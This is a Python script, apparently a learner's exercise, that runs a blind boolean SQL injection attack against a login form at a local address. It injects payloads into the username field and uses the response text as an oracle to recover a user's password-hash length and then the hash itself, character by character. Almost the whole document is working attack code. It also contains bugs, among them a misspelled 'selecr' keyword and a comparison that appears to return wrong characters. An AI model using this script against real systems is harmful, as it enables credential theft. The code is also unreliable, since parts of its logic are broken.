#web application, import req
import requests

#total of number queries made
total_queries = 0

#set characters/hex char
charset = '0123456789abcdef'

#identify targer
target = 'http://127.0.0.1:5000'

#identify valid or unvalid request
needle = 'Welcome back'

#send query to the application/takes a payload as in input
def injected_query(payload):

    #variable outside of 'def'
    global total_queries

    #make request
    r = requests.post(target, data = {'username' : 'admin and {}--'.format(payload), 'password' : 'password' })

    #increase the number of queries
    total_queries += 1

    #convert repsonse to a True or False output
    return needle.encode() not in r.content

#create boolen query to identify if its valid or invalid
def boolean_query(offset, user_id, character, operator = '>'):

    #create payload/sql injections
    payload = '(select hex(substr(password, {}, 1)) from user where id = {}) {} hex ("{}")'.format(offset + 1, user_id, operator, character)

    #send to injected_query on line 17
    return injected_query(payload)

#identify if user is valid 
def invalid_user(user_id):

    #create payload for username
    payload= '(selecr id from user where id = {}) >= 0'.format(user_id)

    #send to injected_query on line 17
    return injected_query(payload)

 #understand the length of the users password
def password_length(user_id):

    #start length at 0
    i = 0

    #continue payload until reached max length of the hash
    while True:

        #create payload
        payload = '(select length(password) from user where id = {} and length(password) <= {} limit 1)'.format(user_id, i)

        #output the last hash attempt/identify length
        if not injected_query(payload):

            #output return
            return i
        
        #increase attempt by 1
        i += 1


#extract user's actual hash characters
def extract_hash(charset, user_id, password_length):

    #store password as its found 
    found = ''

    #iterate each index of the length of the password
    for i in range(0, password_length):

        #iterate the length of each charater in the charset
        for j in range(len(charset)):

            #boolean query/pass character J
            if boolean_query(i, user_id, charset[j]):
                
                #valid
                found += charset[j]
                break

    #return password
    return found

#amount of queries have been taken
def total_queries_taken():

    #use variable outside of 'def'
    global total_queries

    #output query attmepts with 2 tab spacing
    print('\t\t[!] {} total queries!'.format(total_queries))

    #after completing, reset the attempt query
    total_queries = 0

#interact with script
while True:

    try:

        #ask for input from user
        user_id = input('> Enter a user ID to extract the password hash:' )

        #identify if user is valid/error check
        if not invalid_user(user_id):

            #length of the password hash
            user_password_length = password_length(user_id)

            #show user and hash length in interface
            print('\t[-] User {} hash length: {}'.format(user_id, user_password_length))

            #identify amount of queries attempted
            total_queries_taken()

            #extract the hash of the user
            print('\t[-] User {} hash: {}'.format(user_id, extract_hash(charset, int(user_id), user_password_length)))

            #identify query attempts
            total_queries_taken()

        #if check fails/backup
        else:

            #show failed user
            print('\t [X] user {} does not exist!'.format(user_id))

    #clean method to exit loop
    except KeyboardInterrupt:

        #exit infinite loop
        break